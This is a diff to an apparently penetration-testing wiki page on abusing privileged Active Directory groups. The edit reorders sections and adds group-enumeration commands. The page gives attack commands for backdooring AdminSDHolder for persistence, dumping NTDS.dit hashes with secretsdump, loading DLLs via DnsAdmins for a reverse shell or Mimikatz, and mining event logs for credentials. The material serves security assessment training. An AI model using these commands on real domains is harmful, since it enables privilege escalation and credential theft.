@@ -16,36 +16,20 @@
 
 * **Administrators**
 * **Domain Admins**
-* **Enterprise Adminspr**
+* **Enterprise Admins**
 
 There are other account memberships and access token privileges that can also be useful during security assessments when chaining multiple attack vectors.
-
-## AdminSDHolder group
-
-The Access Control List (ACL) of the **AdminSDHolder** object is used as a template to **copy** **permissions** to **all “protected groups”** in Active Directory and their members. Protected groups include privileged groups such as Domain Admins, Administrators, Enterprise Admins, and Schema Admins.\
-By default, the ACL of this group is copied inside all the "protected groups". This is done to avoid intentional or accidental changes to these critical groups. However, if an attacker modifies the ACL of the group **AdminSDHolder** for example giving full permissions to a regular user, this user will have full permissions on all the groups inside the protected group (in an hour).\
-And if someone tries to delete this user from the Domain Admins (for example) in an hour or less, the user will be back in the group.
-
-Add a user to the **AdminSDHolder** group:
-
-```csharp
-Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
-```
-
-Check if the user is inside the **Domain Admins** group:
-
-```
-Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
-```
-
-If you don't want to wait an hour you can use a PS script to make the restore happen instantly: [https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)
-
-[**More information in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
 
 ## Account Operators <a href="#account-operators" id="account-operators"></a>
 
 * Allows creating non administrator accounts and groups on the domain
 * Allows logging in to the DC locally
+
+Get **members** of the group:
+
+```powershell
+Get-NetGroupMember -Identity "Account Operators" -Recurse
+```
 
 Note the spotless' user membership:
 
@@ -59,19 +43,43 @@ As well as login to DC01 locally:
 
 ![](../../.gitbook/assets/a3.png)
 
-## Server Operators <a href="#server-operators" id="server-operators"></a>
+## AdminSDHolder group
 
-This membership allows users to configure Domain Controllers with the following privileges:
+The Access Control List (ACL) of the **AdminSDHolder** object is used as a template to **copy** **permissions** to **all “protected groups”** in Active Directory and their members. Protected groups include privileged groups such as Domain Admins, Administrators, Enterprise Admins, and Schema Admins.\
+By default, the ACL of this group is copied inside all the "protected groups". This is done to avoid intentional or accidental changes to these critical groups. However, if an attacker modifies the ACL of the group **AdminSDHolder** for example giving full permissions to a regular user, this user will have full permissions on all the groups inside the protected group (in an hour).\
+And if someone tries to delete this user from the Domain Admins (for example) in an hour or less, the user will be back in the group.
 
-* Allow log on locally
-* Back up files and directories
-* ``[`SeBackupPrivilege`](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4) and [`SeRestorePrivilege`](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5)&#x20;
-* Change the system time
-* Change the time zone
-* Force shutdown from a remote system
-* Restore files and directories
-* Shut down the system
-* control local services
+Get **members** of the group:
+
+```powershell
+Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
+```
+
+Add a user to the **AdminSDHolder** group:
+
+```powershell
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
+```
+
+Check if the user is inside the **Domain Admins** group:
+
+```powershell
+Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
+```
+
+If you don't want to wait an hour you can use a PS script to make the restore happen instantly: [https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)
+
+[**More information in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
+
+## **AD Recycle Bin**
+
+This group gives you permission to read deleted AD object. Something juicy information can be found in there:
+
+```bash
+#This isn't a powerview command, it's a feature from the AD management powershell module of Microsoft
+#You need to be in the "AD Recycle Bin" group of the AD to list the deleted AD objects
+Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
+```
 
 ### Domain Controller Access
 
@@ -114,6 +122,12 @@ As with `Server Operators` membership, we can **access the `DC01` file system** 
 This is because this group grants its **members** the [**`SeBackup`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4) and [**`SeRestore`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5) privileges. The **SeBackupPrivilege** allows us to **traverse any folder and list** the folder contents. This will let us **copy a file from a folder,** even if nothing else is giving you permissions. However, to abuse this permissions to copy a file the flag [**FILE\_FLAG\_BACKUP\_SEMANTICS**](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) **** must be used. Therefore, special tools are needed.
 
 For this purpose you can use [**these scripts**](https://github.com/giuliano108/SeBackupPrivilege)**.**
+
+Get **members** of the group:
+
+```powershell
+Get-NetGroupMember -Identity "Backup Operators" -Recurse
+```
 
 ### **Local Attack**
 
@@ -186,24 +200,6 @@ Finally you can **get all the hashes** from the **`NTDS.dit`**:
 secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
 
-## Print Operators
-
-The members of this gorup are granted:
-
-* [**`SeLoadDriverPrivilege`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#seloaddriverprivilege-3.1.7)
-* **Log on locally to a Domain Controller** and shut it down
-* Permissions to **manage**, create, share, and delete **printers connected to a Domain Controller**
-
-{% hint style="warning" %}
-If the command `whoami /priv`, doesn't show the **`SeLoadDriverPrivilege`** from an unelevated context, you need to bypass UAC.
-{% endhint %}
-
-Check in this page how to abuse the SeLoadDriverPrivilege to privesc:
-
-{% content-ref url="../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/abuse-seloaddriverprivilege.md" %}
-[abuse-seloaddriverprivilege.md](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/abuse-seloaddriverprivilege.md)
-{% endcontent-ref %}
-
 ## DnsAdmins
 
 A user who is member of the **DNSAdmins** group or have **write privileges to a DNS** server object can load an **arbitrary DLL** with **SYSTEM** privileges on the **DNS server**.\
@@ -216,6 +212,12 @@ As shown in this **** [**post**](https://adsecurity.org/?p=4064), the following 
 * When a member of the **`DnsAdmins`** group runs the **`dnscmd`** command below, the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` registry key is populated
 * When the **DNS service is restarted**, the **DLL** in this path will be **loaded** (i.e., a network share that the Domain Controller's machine account can access)
 * An attacker can load a **custom DLL to obtain a reverse shell** or even load a tool such as Mimikatz as a DLL to dump credentials.
+
+Get **members** of the group:
+
+```powershell
+Get-NetGroupMember -Identity "DnsAdmins" -Recurse
+```
 
 ### Execute arbitrary DLL
 
@@ -267,21 +269,14 @@ After **disabling the global query** block list and creating a **WPAD record**, 
 [spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
 {% endcontent-ref %}
 
-## **AD Recycle Bin**
-
-This group gives you permission to read deleted AD object. Something juicy information can be found in there:
-
-```bash
-#This isn't a powerview command, it's a feature from the AD management powershell module of Microsoft
-#You need to be in the "AD Recycle Bin" group of the AD to list the deleted AD objects
-Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
-```
-
 ## Event Log Readers
 
 Members of the [**Event Log Readers**](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255\(v=ws.11\)?redirectedfrom=MSDN#event-log-readers) **** group have **permission to access the event logs** generated (such as the new process creation logs). In the logs **sensitive information** could be found. Let's see how to visualize the logs:
 
 ```powershell
+#Get members of the group
+Get-NetGroupMember -Identity "Event Log Readers" -Recurse
+
 # To find "net [...] /user:blahblah password"
 wevtutil qe Security /rd:true /f:text | Select-String "/user"
 # Using other users creds
@@ -326,6 +321,81 @@ C:\htb> sc.exe start MozillaMaintenance
 {% hint style="info" %}
 This vector has been mitigated by the March 2020 Windows security updates, which changed behavior relating to hard links.
 {% endhint %}
+
+## Print Operators
+
+The members of this gorup are granted:
+
+* [**`SeLoadDriverPrivilege`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#seloaddriverprivilege-3.1.7)
+* **Log on locally to a Domain Controller** and shut it down
+* Permissions to **manage**, create, share, and delete **printers connected to a Domain Controller**
+
+{% hint style="warning" %}
+If the command `whoami /priv`, doesn't show the **`SeLoadDriverPrivilege`** from an unelevated context, you need to bypass UAC.
+{% endhint %}
+
+Get **members** of the group:
+
+```powershell
+Get-NetGroupMember -Identity "Print Operators" -Recurse
+```
+
+Check in this page how to abuse the SeLoadDriverPrivilege to privesc:
+
+{% content-ref url="../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/abuse-seloaddriverprivilege.md" %}
+[abuse-seloaddriverprivilege.md](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/abuse-seloaddriverprivilege.md)
+{% endcontent-ref %}
+
+## Remote Desktop Users
+
+Members of this group can access the PCs over RDP.\
+Get **members** of the group:
+
+```powershell
+Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
+Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
+```
+
+More info about **RDP**:
+
+{% content-ref url="../../network-services-pentesting/pentesting-rdp.md" %}
+[pentesting-rdp.md](../../network-services-pentesting/pentesting-rdp.md)
+{% endcontent-ref %}
+
+## Remote Management Users
+
+Members of this group can access PCs over **WinRM**.
+
+```powershell
+Get-NetGroupMember -Identity "Remote Management Users" -Recurse
+Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
+```
+
+More info about **WinRM**:
+
+{% content-ref url="../../network-services-pentesting/5985-5986-pentesting-winrm.md" %}
+[5985-5986-pentesting-winrm.md](../../network-services-pentesting/5985-5986-pentesting-winrm.md)
+{% endcontent-ref %}
+
+## Server Operators <a href="#server-operators" id="server-operators"></a>
+
+This membership allows users to configure Domain Controllers with the following privileges:
+
+* Allow log on locally
+* Back up files and directories
+* ``[`SeBackupPrivilege`](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4) and [`SeRestorePrivilege`](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5)&#x20;
+* Change the system time
+* Change the time zone
+* Force shutdown from a remote system
+* Restore files and directories
+* Shut down the system
+* control local services
+
+Get **members** of the group:
+
+```powershell
+Get-NetGroupMember -Identity "Server Operators" -Recurse
+```
 
 ## References <a href="#references" id="references"></a>
 
